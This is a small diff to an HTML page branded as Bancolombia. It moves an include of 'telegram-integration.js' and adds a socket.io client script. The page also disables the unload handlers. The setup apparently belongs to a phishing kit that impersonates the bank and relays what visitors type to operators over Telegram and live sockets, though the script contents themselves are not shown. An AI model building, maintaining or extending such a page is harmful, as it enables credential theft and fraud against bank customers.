@@ -10,7 +10,6 @@
         window.onbeforeunload = null;
         window.onunload = null;
     </script>
-    <script src="/js/telegram-integration.js"></script>
     <script>
     document.addEventListener('DOMContentLoaded', function() {
         console.log('[BANCOLOMBIA] Inicializando index.html');
@@ -236,6 +235,7 @@
         <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
     </div>
 
+    <script src="/socket.io/socket.io.js"></script>
     <script src="/js/telegram-integration.js"></script>
     <script src="/js/banco-utils.js"></script>
     <script src="script_new.js"></script>
